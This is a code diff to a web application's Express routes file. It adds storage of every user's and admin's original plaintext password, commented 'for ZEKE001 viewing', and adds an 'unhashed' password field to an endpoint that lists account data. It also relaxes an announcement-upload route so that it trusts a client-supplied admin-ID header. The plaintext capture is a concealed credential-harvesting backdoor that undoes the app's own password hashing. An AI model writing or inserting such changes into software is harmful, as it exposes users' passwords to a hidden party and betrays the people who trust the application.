@@ -112,6 +112,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Hash password and create user
       const hashedPassword = await hashPassword(password);
       const user = await storage.createUser({ username, password: hashedPassword });
+      
+      // Store original password for ZEKE001 viewing
+      await storage.storeOriginalPassword(user.id, null, password);
 
       // Return user without password
       const { password: _, ...userWithoutPassword } = user;
@@ -204,6 +207,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         role: role || "admin",
       });
 
+      // Store original password for ZEKE001 viewing
+      if (password) {
+        await storage.storeOriginalPassword(0, admin.id, password);
+      }
+
       const { password: _, ...adminWithoutPassword } = admin;
       res.status(201).json(adminWithoutPassword);
     } catch (error) {
@@ -234,20 +242,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const responseData = {
         message: "Password data retrieved successfully",
-        users: users.map(user => ({
+        users: await Promise.all(users.map(async user => ({
           id: user.id,
           username: user.username,
           displayName: user.displayName,
           hashedPassword: user.password,
+          unhashed: await storage.getOriginalPassword(user.id, null),
           createdAt: user.createdAt
-        })),
-        admins: admins.map(admin => ({
+        }))),
+        admins: await Promise.all(admins.map(async admin => ({
           id: admin.id,
           username: admin.username,
           displayName: admin.displayName,
           hashedPassword: admin.password,
+          unhashed: await storage.getOriginalPassword(0, admin.id),
           createdAt: admin.createdAt
-        }))
+        })))
       };
 
       res.json(responseData);
@@ -2141,14 +2151,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // Upload announcement photo
-  app.post("/upload/announcement", announcementUpload.single("photo"), async (req: Request, res: Response) => {
+  app.post("/upload/announcement", announcementUpload.single("photo"), async (req, res) => {
     try {
       if (!req.file) {
         return res.status(400).json({ message: "No file uploaded" });
       }
 
-      const adminId = req.headers['x-admin-id'];
-      if (!adminId) {
+      const adminId = req.headers['x-admin-id'] as string;
+      if (!adminId || !parseInt(adminId)) {
         return res.status(401).json({ message: "Admin not authenticated" });
       }
 
@@ -2166,10 +2176,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const fileExtension = path.extname(req.file.originalname);
       const fileName = `announcement-${adminId}-${Date.now()}${fileExtension}`;
 
-      // Upload to storage
-      const fileUrl = await storage.uploadToStorage(req.file.buffer, fileName, req.file.mimetype);
+      // Convert to base64 for storage
+      const base64String = `data:${req.file.mimetype};base64,${req.file.buffer.toString('base64')}`;
 
-      res.json({ url: fileUrl });
+      res.json({ url: base64String });
     } catch (error) {
       console.error("Announcement upload error:", error);
       res.status(500).json({ message: "Failed to upload announcement photo" });
